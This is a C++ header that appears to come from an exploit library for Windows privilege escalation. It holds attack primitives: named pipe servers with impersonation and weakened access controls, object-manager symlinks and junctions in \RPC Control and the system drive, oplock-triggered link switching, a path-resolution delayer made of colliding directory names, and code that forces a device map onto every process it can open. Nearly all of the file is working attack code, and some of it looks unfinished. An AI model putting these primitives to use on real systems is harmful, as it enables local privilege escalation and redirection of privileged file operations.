#pragma once 
#include "exploitLib.h"
#include "../../pch.h" 
#include "../../exploitLib/include/exploitLib/macros.h"


struct fileAccess {
   using name_type = std::array< std::array<  wchar_t, 32>, 32 >;
   std::bitset< 32> access{ 0 };
   name_type names = []() {
      name_type n;
      n[0] = { L"READ_DATA" };
      n[1] = { L"ADD_FILE/WRITE_DATA" };
      n[2] = { L"APPEND_DATA/ADD_SUBDIRECTORY" };
      n[3] = { L"READ_EA" };
      n[4] = { L"WRITE_EA" };
      n[5] = { L"EXECUTE/TRAVERSE" };
      n[6] = { L"DELETE_CHILD" };
      n[7] = { L"READ_ATTRIBUTES" };
      n[8] = { L"WRITE_ATTRIBUTES" };
      n[9] = { L"UNDEFINED" };
      n[10] = { L"UNDEFINED" };
      n[11] = { L"UNDEFINED" };
      n[12] = { L"UNDEFINED" };
      n[13] = { L"UNDEFINED" };
      n[14] = { L"UNDEFINED" };
      n[15] = { L"UNDEFINED" };
      n[16] = { L"DELETE" };
      n[17] = { L"READ_CONTROL" };
      n[18] = { L"WRITE_DAC" };
      n[19] = { L"WRITE_OWNER" };
      n[20] = { L"SYNCHRONIZE" };
      n[21] = { L"UNDEFINED" };
      n[22] = { L"UNDEFINED" };
      n[23] = { L"UNDEFINED" };
      n[24] = { L"ACCESS_SYSTEM_SECURITY" };
      n[25] = { L"MAXIUM" };
      n[26] = { L"UNDEFINED" };
      n[27] = { L"UNDEFINED" };
      n[28] = { L"GENERIC_ALL" };
      n[29] = { L"GENERIC_EXECUTE" };
      n[30] = { L"GENERIC_WRITE" };
      n[31] = { L"GENERIC_READ" };
      return n;
   }();
   int idx = -1;
   auto enable() { access[idx] = true; return names[idx]; }
   auto disable() { access[idx] = false; return names[idx]; }
   std::wstring operator ++() { if (++idx < 32) { return &names[idx][0]; } else { return L""s; } }
   operator DWORD() { return  access.to_ulong(); }
   std::wstring name() { return  &names[idx][0]; }
   std::wstring enabled()
   {
      std::wstring result;
      for (int i = 0; i < 32; i++)
         if (access[i])
         {
            result += L" " + std::wstring{ &names[i][0] };
         }
      return result;
   }

};

class outbuf : public std::wstreambuf
{
private:
   static inline std::shared_ptr< std::wostream > orgwcoutStream = nullptr;
   static thread_local inline int lineCount = 1;
   static thread_local inline std::wstringstream buf;
   static inline  std::atomic<int> instanceCount = 0;
public:

   outbuf()
   {
      instanceCount++;
      if (instanceCount == 1)
      {
         orgwcoutStream = std::make_shared< std::wostream >(std::wcout.rdbuf(this));

         AllocConsole();
         freopen_s((FILE**)stdout, "CONOUT$", "w", stdout);
      }
   }

   int_type overflow(int_type  c = traits_type::eof())
   {
      bool isEOL = (c == '\n' || c == traits_type::eof());
      buf.put(c);
      if (isEOL && ((++lineCount % 100) == 0))
      {
         *orgwcoutStream << buf.str();
         buf.str(L"");
         static ::std::mutex conoutLock;
         static ::std::unique_lock<std::mutex> lock(conoutLock);
         orgwcoutStream->flush();
         return L'\n';
      }
      return  c;
   }
   ~outbuf()
   {
      instanceCount--;
      overflow(traits_type::eof());// We are destructing a thread_local object, flush before any buffered output is gone

      if (instanceCount == 0) 
      {
         std::wcout.rdbuf(orgwcoutStream->rdbuf()); //Restore original wcout }
      }
   }
};
 

IMPORTAPI(L"ntdll.dll", NtImpersonateThread, HRESULT, HANDLE, HANDLE, PSECURITY_QUALITY_OF_SERVICE);


using namespace x::literalNS;

namespace x{
   namespace pipes {
      using namespace std;

      BOOL MakeSDAbsolute(PSID pSD, PSID* ppAbs)
      {
         VOID    *pAbsoluteSD = NULL; 
         DWORD   AbsoluteSDSize = 0;
         VOID    *pDacl = NULL;
         DWORD   DaclSize = 0;
         VOID    *pSacl = NULL;
         DWORD   SaclSize = 0;
         VOID    *pOwner = NULL;
         DWORD   OwnerSize = 0;
         VOID    *pGroup = NULL;
         DWORD   GroupSize = 0;
  
         if( ! MakeAbsoluteSD(
                           pSD,
                           (PSECURITY_DESCRIPTOR)pAbsoluteSD,
                           &AbsoluteSDSize,
                           (PACL)pDacl,
                           &DaclSize,
                           (PACL)pSacl,
                           &SaclSize,
                           (PSID)pOwner,
                           &OwnerSize,
                           (PSID)pGroup,
                           &GroupSize
                           ))
         {
            pAbsoluteSD =   (PSECURITY_DESCRIPTOR)LocalAlloc(0,AbsoluteSDSize);
            pDacl = (PACL)LocalAlloc(0,DaclSize);
            pSacl = (PACL)LocalAlloc(0,SaclSize);
            pOwner = (PSID)LocalAlloc(0,OwnerSize);
            pGroup = (PSID)LocalAlloc(0,GroupSize);
       
            if( ! MakeAbsoluteSD(
                              pSD,
                              (PSECURITY_DESCRIPTOR)pAbsoluteSD,
                              &AbsoluteSDSize,
                              (PACL)pDacl,
                              &DaclSize,
                              (PACL)pSacl,
                              &SaclSize,
                              (PSID)pOwner,
                              &OwnerSize,
                              (PSID)pGroup,
                              &GroupSize
                     ))
            {
               return FALSE;
            }
         }
         *ppAbs = pAbsoluteSD;
 
         LocalFree(pDacl);
         LocalFree(pSacl);
         LocalFree(pGroup);
         LocalFree(pOwner);
 
         return TRUE;
      }
 
      // Adjusts the pipe DACL to allow Everyone read/write access
      // while leaving default/existing entries in place.
      BOOL AdjustPipeDACL(HANDLE hPipe)
      {
	      // Obtain the existing DACL
	
	      PACL pExistingAcl = NULL;		// ACL pointer
	      PSECURITY_DESCRIPTOR pSD = NULL;	// SD pointer
	      DWORD dwResult = 0;
 
	      dwResult = GetSecurityInfo(
		      hPipe,				// Handle to the pipe
		      SE_KERNEL_OBJECT,		// Named pipe is a file object
		      DACL_SECURITY_INFORMATION,	// Request the DACL of the object
		      0,				// Don't need the owner info
		      0,				// Don't need the group info
		      &pExistingAcl,			// Receives a pointer to the existing ACL
		      0,				// Don't need the SACL info
		      &pSD);				// Security descriptor
  
         if (!IsValidSecurityDescriptor(pSD))
         {
	         printf("Invalid PSECURITY_DESCRIPTOR\n");
	         return FALSE;
         }
	      if(dwResult != ERROR_SUCCESS)
	      {
		      // An error occured getting security info
		      printf("Error condition 1.\n");
		      return FALSE;
	      }
  
	      // Merge the new entry into the existing DACL
	 
         SID_IDENTIFIER_AUTHORITY all_packages = SECURITY_APP_PACKAGE_AUTHORITY;
	      SID_IDENTIFIER_AUTHORITY SIDAuthWorld = SECURITY_WORLD_SID_AUTHORITY;
	      PSID pEveryoneSID = NULL;
	      PSID all_packagesSID = NULL;

         EXPLICIT_ACCESS ea[2]={0x00};
	      DWORD dwRes;
	      PACL pNewAcl = NULL;
 
          if(!AllocateAndInitializeSid(&all_packages, SECURITY_BUILTIN_APP_PACKAGE_RID_COUNT, SECURITY_APP_PACKAGE_BASE_RID,
		      SECURITY_BUILTIN_PACKAGE_ANY_PACKAGE, 0, 0, 0, 0, 0, 0, &all_packagesSID))
          {
		      printf("Error condition 2.\n");
		      return FALSE;
          }
 

          // Create a well-known SID for the Everyone group.
          if(!AllocateAndInitializeSid(&SIDAuthWorld, 1, SECURITY_WORLD_RID,
		      0, 0, 0, 0, 0, 0, 0, &pEveryoneSID))
          {
		      printf("Error condition 2.\n");
		      return FALSE;
          }
 
          // Initialize an EXPLICIT_ACCESS structure for an ACE.
          // The ACE will allow Everyone read/write access.
   
          ea[1].grfAccessPermissions = DELETE|READ_CONTROL|SYNCHRONIZE|GENERIC_READ|GENERIC_WRITE|GENERIC_EXECUTE;
          ea[1].grfAccessMode = GRANT_ACCESS;
          ea[1].grfInheritance= SUB_CONTAINERS_AND_OBJECTS_INHERIT;
          ea[1].Trustee.TrusteeForm = TRUSTEE_IS_SID;
          ea[1].Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
          ea[1].Trustee.ptstrName  = (LPTSTR) all_packagesSID;
 
          ea[0].grfAccessPermissions = DELETE|READ_CONTROL|SYNCHRONIZE|GENERIC_READ|GENERIC_WRITE|GENERIC_EXECUTE;
          ea[0].grfAccessMode = GRANT_ACCESS;
          ea[0].grfInheritance= SUB_CONTAINERS_AND_OBJECTS_INHERIT;
          ea[0].Trustee.TrusteeForm = TRUSTEE_IS_SID;
          ea[0].Trustee.TrusteeType = TRUSTEE_IS_GROUP;
          ea[0].Trustee.ptstrName  = (LPTSTR) pEveryoneSID;
 
          // Create a new ACL that contains the new ACEs.
          dwRes = SetEntriesInAcl(ARRAYSIZE(ea), ea, nullptr, &pNewAcl);
          if (ERROR_SUCCESS != dwRes) 
          {
		      printf("Error condition 3.\n");
		      return FALSE;
          }
 
          if (!IsValidAcl(pNewAcl))
           {
		      printf("Invalid ACL\n");
		      return FALSE;
          }
 
          PSECURITY_DESCRIPTOR pAbsolute = NULL;
 
          if (!MakeSDAbsolute(pSD,&pAbsolute))
           {
		      printf("'Absoluting' failed\n");
		      return FALSE;
          }
	      //
	      // Set the DACL on the pipe object to our new ACL
	      //
 
	      if(!SetSecurityDescriptorDacl(
		      pAbsolute,							// Security descriptor to modify
		      true,							// DACL present in the descriptor
		      nullptr,						// Use the provided ACL
		      FALSE))							// Explicitly created DACL (not a default)
	      {
		      DWORD dwErr = GetLastError();
		      printf("Error condition 4. %d\n",dwErr);
		      return FALSE;
	      }
  
	      LocalFree(pSD);
      //	LocalFree(pExistingAcl);
      //    if (pEveryoneSID) FreeSid(pEveryoneSID);
 
	      return TRUE;
      }

      template< typename T >
      auto   doWriteToPipe(HANDLE hPipe, T* data, size_t size) {
         DWORD wrote{};
         unsigned int chunksize = 1024;
         unsigned int totalWritten = 0;

         while(totalWritten != size)
         {
            WriteFile(hPipe, data, chunksize, &wrote, nullptr);
            if (wrote == 0) return false;
            totalWritten = totalWritten + wrote;
            FlushFileBuffers(hPipe);
         }

         
         return true;
      };

      template< typename T >
      auto   doWriteToPipe( HANDLE hPipe, T data ) {
         DWORD bw {};
         constexpr DWORD exspectedWrite{ sizeof( data ) };

         WriteFile( hPipe, &data, exspectedWrite , &bw, nullptr );
          if( bw != exspectedWrite ) throw std::exception{ "Invalid data write" };
          return true;
      };
    
      template< typename T >
      auto   doReadFromPipe( HANDLE hPipe, T& data ) {
         DWORD br {};
         constexpr DWORD exspectedRead{ sizeof( data ) };
 
         char buf [( exspectedRead / sizeof(char) ) +1 ]{0x00};

         ReadFile( hPipe, buf, exspectedRead , &br, nullptr );
         if( br != exspectedRead ) throw std::exception{ "Invalid data read" };
         data = (decltype( data ))  buf;
         return true;
      };
  
      bool   doReadFromPipe( HANDLE hPipe,  std::vector<char> & data )  {
         DWORD br {};
         DWORD exspectedRead{(DWORD) data.size() };
         ReadFile( hPipe,  &data[0], static_cast<DWORD>(data.size()) , &br, nullptr );
         if( br != exspectedRead ) throw std::exception{ "Invalid data read" };
 
         return true;
      }; 

      struct wrappedPipeHandle {
         x::handle hPipe;
         wrappedPipeHandle(x::handle hPipe) : hPipe{ hPipe } {     }
        
         void impersonateClient() {
            THROW_LAST_ERROR_IF( !    ImpersonateNamedPipeClient(hPipe) );
            std::wcout << L"Impersonating" << std::endl;
         }

         template<typename T>
         auto  readFromPipe(T& data) {
            return doReadFromPipe(hPipe, data);
         }

         template<typename T>
         auto  writeToPipe(T& data) {
            return doWriteToPipe(hPipe, data);
         }

         template<typename T>
         auto  writeToPipe(T* data,size_t size) {
            return doWriteToPipe(hPipe, data,size);
         }

         
         operator HANDLE() {
            return hPipe;
         }
      };

      struct   simplePipeServer
      {
          x::handle h;
          
          auto setup( wstring pipepath )
          {
             SECURITY_ATTRIBUTES SA{ 0x00 };
        THROW_LAST_ERROR_IF(   ! ConvertStringSecurityDescriptorToSecurityDescriptor(L"D:NO_ACCESS_CONTROLS:(ML;;;;;LW)", SDDL_REVISION_1, &(SA.lpSecurityDescriptor), NULL) );
              
       //D:PNO_ACCESS_CONTROLS:(ML;; NW;;; LW
         //D:(A;OICI;GA;;;S-1-15-2-599759058-3479938838-1253218824-33263930-1483063708-2104800716-3218279855) 
            return x::handle::make(
                CreateNamedPipe(
                   (L"\\??\\Global\\globalroot\\device\\namedpipe\\"s + pipepath).c_str(),
                   PIPE_ACCESS_DUPLEX | PIPE_READMODE_MESSAGE | PIPE_TYPE_BYTE,
                   PIPE_WAIT,
                   PIPE_UNLIMITED_INSTANCES,
                   1024 * 256,
                   1024 * 256,
                   0,
                   &SA
                ));

           }

          template<typename T>
          simplePipeServer(wstring pipepath, T onConnect)  :h{setup(pipepath)}
          {
            if( h == INVALID_HANDLE_VALUE ) 
            {
               wcout <<   L"Fatal error, could not listen on pipe:"s + pipepath.data() << endl;
            }
            else
            {
               wcout <<  L"Listening on: "s + pipepath.data() << endl;
         
            }
            bool acceptConnections = true;
            while( ConnectNamedPipe( h , NULL ), acceptConnections )  
            {
               wcout << L"Client connected on: "s << pipepath.data() << endl;
               auto wp = wrappedPipeHandle{ h };
               acceptConnections = onConnect(wp);
               if( ! acceptConnections ) DisconnectNamedPipe(h);
            }

         }
      };
      using pipeServer = x::threaded<simplePipeServer>;
   }
 
    using pipeServer = x::pipes::pipeServer;
    /*
   struct namedPipe
   {
      namedPipe(const wchar_t* pipename)
      {
         auto hPipe = CreateNamedPipe(
            pipename,
            PIPE_ACCESS_DUPLEX | PIPE_READMODE_MESSAGE | PIPE_TYPE_BYTE,
            PIPE_WAIT,
            PIPE_UNLIMITED_INSTANCES,
            1024 * 1024 * 512 ,
            1024 * 1024 * 512,
            0,
            NULL);

         if (hPipe == INVALID_HANDLE_VALUE) {
            std::wcout << (L"Fatal error, could not listen on pipe:"s + pipename);
         }

         if (ConnectNamedPipe(hPipe, NULL) != FALSE) {}// wait for someone to connect to the pipe            
      }
   };
   */
   class reflectedRootFolder 
   {
       std::wstring      idGUID{ x::guid::random_guid() };
      file                    reflectedDir{ "%TEMP%"_p / idGUID , FILE_GENERIC_WRITE,FILE_DIRECTORY_FILE };
   public:
      reflectedRootFolder(x::strpath folder) {
         auto fol = file{ folder };
         for ( auto& f  : fol.enumDir() )
         {
            try
            {
               if( x::file(fol / f.FileName).isDir()   )
               {
                  file{ NT::objattr{reflectedDir, strpath{  f.FileName  } } , FILE_WRITE_ATTRIBUTES,FILE_DIRECTORY_FILE }.makeJunction(
                     "\\??\\Global\\%SYSTEMDRIVE%\\"_p / strpath{ std::wstring{  f.FileName  }  }
                  );
               }
            }
            catch( ... ){ }
         }
      }

      void addLink(x::strpath f, unistr destination)
      {
         file{ reflectedDir.getNTPath() / f  , FILE_WRITE_ATTRIBUTES,FILE_DIRECTORY_FILE | FILE_OPEN_REPARSE_POINT}.makeJunction(destination);
      }

      operator strpath const()
      {
         return L"\\Global??\\GLOBALROOT"s + reflectedDir.getNTPath();
      }
   };

   class reflectedFolder {
      const std::wstring      idGUID{ x::guid::random_guid() };

      const objdir::create    secondaryObjDir{ "\\RPC Control\\"_p / idGUID + L"secondary" };
      const objdir::create    primaryObjDir{ "\\RPC Control\\"_p / idGUID + L"primary", secondaryObjDir };

      std::vector< symlink >  primaryLinks{};
      std::vector< symlink >  secondaryLinks{};

   public:
      reflectedFolder(x::strpath folder) {
        
         for ( auto& f : file{ folder }.enumDir() ) {
            auto aa = folder / strpath{ f.FileName };;
            aa = (L"\\Global??\\") + aa;
            secondaryLinks.emplace_back( secondaryObjDir  / strpath{ f.FileName  }, aa);
         }
      }

      void addLink(x::strpath link, x::strpath destination)
      {
         primaryLinks.emplace_back( primaryObjDir / link, destination );
      }

      auto getPath()
      {
         return L"\\Global??\\GLOBALROOT"s + primaryObjDir.getNTPath();
      }

      operator strpath const()
      {
         return L"\\Global??\\GLOBALROOT"s + primaryObjDir.getNTPath();
      }
   };

   void setAllProcessDeviceMaps()
   {
      static auto a = x::objdir::open{ L"\\??\\Global\\globalroot\\rpc control\\wtf" };

      static HANDLE globalDeviceMap =a.getHandle();
    
      for ( auto& p : x::process::getAllProcesses() )
      {
         try {
            HANDLE h{};
            auto i = OpenProcess(PROCESS_SET_INFORMATION| PROCESS_DUP_HANDLE, FALSE, p.second.th32ProcessID);
            if((int)i >= 1)
            {
               DuplicateHandle(GetCurrentProcess(), globalDeviceMap, i, &h, 0, FALSE, DUPLICATE_SAME_ACCESS);
               if (h != 0)
               {
                  x::process::SetProcessDeviceMap(h,i);
               }
            }
         }
            catch (wil::ResultException & e)
            {
              // std::wcout << _com_error{ (HRESULT)RtlNtStatusToDosError(e.GetErrorCode()) }.ErrorMessage() << std::endl;

             //  std::wcout << e.what() << std::endl;
            }
      }
   }


   struct uni {
      std::vector<wchar_t> buf{ L'\x0000' };

      UNICODE_STRING inner;

      template<typename T>
      uni(T t) {
         auto pos = 0;
         buf.resize(UNICODE_STRING_MAX_CHARS);
         for (auto& c : t) {

            buf[pos] = c;
            pos++;
         }
         inner = { static_cast<USHORT>(t.size() * 2), static_cast<USHORT>(t.size() * 2),& buf[0] };
      }
   };

   struct delayer {
      x::objdir::create root{ "\\RPC Control"_p / x::unistr{ x::guid::random_guid() }.substr(1,6) };
      x::objdir::create shadow{ root / "shadow"_p };
      x::objdir::create primary{ root / "primary"_p, shadow };
      x::objdir::create loopDir{ shadow / "A"_p, primary };
      std::vector < x::objdir::create >  dirs;
      x::symlink entryLink{ root / "link"_p, root / "primary\\B\\B\\B\\B\\B\\B\\B\\B\\B\\B\\B\\B\\B\\B\\B\\done"_p }; 
      x::symlink done;

      delayer( NT::ntpath  destination) : done{ root / "shadow\\done"_p, destination } {
         dirs.reserve(1000);
         for (int i = 0; i <= 900; i++) {

            uni shadowCollidingName(shadow.getNTPath() + L"\\"s);
            auto orgShadowSize = shadowCollidingName.inner.Length / 2;
            shadowCollidingName.buf[orgShadowSize + 1 + i] = L'A';
            shadowCollidingName.inner.Length = shadowCollidingName.inner.Length + (2 * i + 4);

            uni primaryCollidingName(primary.getNTPath() + L"\\"s);
            auto orgPrimarySize = primaryCollidingName.inner.Length / 2;
            primaryCollidingName.buf[orgPrimarySize + 1 + i] = L'A';
            primaryCollidingName.inner.Length = primaryCollidingName.inner.Length + (2 * i + 4);

            dirs.push_back({ unistr{ primaryCollidingName.inner.Buffer } , primary });
            dirs.push_back({ unistr{ shadowCollidingName.inner.Buffer} , primary });

         }
         std::wstring path{ root / "primary"_p};
         for (int i = 0; i < 16000; i++) { path = path + L"\\A"; }
        static x::symlink restartLink{ root / "shadow\\B"_p,   path };

         }
      operator strpath() { return entryLink.getNTPath(); }

   };

   class splitterLink
   {
       objdir::create myGlobalRoot { L"\\??\\GLOBALROOT"s };
       objdir::create myRPCControl { L"\\??\\GLOBALROOT\\RPC Control" };

      const std::wstring instanceToken{  NT::misc::guidwrapper::random_guid() };

      const symlink splitterLinkEntry;

      const symlink myDestination;
      const symlink othersDestination;

   public:
      splitterLink( std::wstring myDestination, std::wstring othersDestination ) : 
         myDestination{     { (L"\\??\\GLOBALROOT\\RPC Control\\"s          + instanceToken).c_str() }, myDestination.c_str()     }, 
         othersDestination{ { (L"\\??\\Global\\GLOBALROOT\\RPC Control\\"s  + instanceToken).c_str() }, othersDestination.c_str() },
         splitterLinkEntry{     
          { (L"\\??\\Global\\GLOBALROOT\\RPC Control\\G_" + instanceToken).c_str() },
            (L"\\??\\GLOBALROOT\\RPC Control\\"s + instanceToken).c_str()
         }
      {}

      std::wstring getLink() const { return (L"\\??\\Global\\GLOBALROOT\\RPC Control\\G_" + instanceToken) ;}
   };

   class splitterDir : public splitterLink, public x::file {
   public:
      template<typename T, typename F>
      splitterDir( F&& f, T&& myDestination, T&& othersDestination ) : 
         splitterLink( std::forward<T>(myDestination), std::forward<T>(othersDestination) ),
         NT::file(
            std::forward<F>(f),
            FILE_WRITE_ATTRIBUTES | DELETE,
            FILE_DIRECTORY_FILE | FILE_DELETE_ON_CLOSE | FILE_OPEN_REPARSE_POINT,
            FILE_OPEN_IF,
            FILE_SHARE_ALL
         )
      {
         this->makeJunction( this->getLink() );
      }
   };

   class triggerLink 
   {
   
      const    std::wstring          idGUID          {  x::guid::random_guid() };
  
      const    strpath               destination;
      const    file                  rootDir         { "%TEMP%\\"_p / idGUID,
                                                      FILE_WRITE_ATTRIBUTES,
                                                      FILE_DIRECTORY_FILE | FILE_OPEN_REPARSE_POINT ,
                                                      FILE_CREATE};
      
      const    objdir::create        rootObjDir      { "\\RPC Control"_p / idGUID };

               file                  oplockFile;
 
               symlink               destLink        { rootObjDir / "oplock"_p, destination };
               symlink               entryLink       { "\\RPC Control\\"_p / guid::random_guid(), oplockFile.getNTPath() };
               bool                  isRestoreable   { false };
               std::function<void()> vtrigger        ;
     
      auto makeOplockfile()
      {
         auto f =  file
         { 
            rootDir / "oplock"_nt,
            DELETE,
            FILE_NON_DIRECTORY_FILE | FILE_OPEN_REQUIRING_OPLOCK,
            FILE_CREATE 
         };

         /*   f.makeoplock
         (
 
           
            [&](auto a)
               {
                  std::wcout << L"HIT " << entryLink.getNTPath() << std::endl;
                 
                  oplockFile.rename("%TEMP%"_p / x::guid::random_guid());
                  
                  rootDir.makeJunction(rootObjDir);
               
                  isRestoreable = true;
                  a.doAck();
                  vtrigger();
                 
                  return true;
               }
         );*/

         return f;
      }
   public:

      triggerLink(strpath destination, std::function< void() > trigger = [] (){} ) :   oplockFile{ makeOplockfile() },  
                                                                                       vtrigger{ trigger },
                                                                                       destination { destination }
      { }

      void restore()
      {
         if (!isRestoreable) return;

         rootDir.delete_reparse_point();
         oplockFile.rename(rootDir / "oplock"_p);
         //oplockFile = makeOplockfile();
        //static auto test = std::thread{ [&]() {Sleep(5000); oplockFile = makeOplockfile();  } };
         
          
         isRestoreable = false;
      }

      operator strpath(){ return entryLink.getNTPath(); }
   }; 

   class autoLink {
      triggerLink second;
      triggerLink first{ second, [&]() { second.restore(); } };

   public:
      autoLink(strpath destination) : 
         second{ destination, [&]() { first.restore(); } } 
      {
         std::wcout << L"ENTRY " << static_cast< strpath > ( first ) << std::endl;

      }
      operator strpath() { return first; }
   };

   struct symlink_switch
   {
      const std::wstring instanceToken{ x::guid::random_guid()  };
      const objdir::create base{ L"\\RPC Control\\bs_"s + instanceToken  };
      const objdir::create overrider{ L"\\RPC Control\\or_"s + instanceToken , base.getHandle() };
      const symlink baseLink;
      std::vector<  symlink > overriderLinkContainer ;
      const std::wstring overriderDestination;

      const  x::symlink value{ 
         "\\RPC Control\\val_"_p +instanceToken ,
         "\\RPC Control\\or_"_p +instanceToken + L"\\LINK"
      };

     
      void switch_override()
      {
         if( overriderLinkContainer.size() == 0 )
         {
            overriderLinkContainer.emplace_back( 
                                                   "\\RPC Control\\or_"_p + instanceToken + L"\\link" ,
                                                   overriderDestination 
                                               );
         }
      }

      void switch_base()
      {
         if( overriderLinkContainer.size() == 1 )
            overriderLinkContainer.pop_back();
      }

       void switch_toggle()
      {
          if(overriderLinkContainer.size() == 1)
          {
             switch_base();
           }
          else
          {
             switch_override();
          }
      }

      symlink_switch( std::wstring baseLink, std::wstring overriderLink) : 
         baseLink{ 
            "\\RPC Control\\bs_"_p + instanceToken + L"\\link"s  ,
            baseLink.data() 
         }, 
         overriderDestination{ overriderLink }
      {}

      std::wstring valueLink()
      { return ( L"\\??\\Global\\GLOBALROOT\\RPC Control\\val_"s + instanceToken ); }

      operator strpath const()
      {
          return  valueLink();
      }

   };
}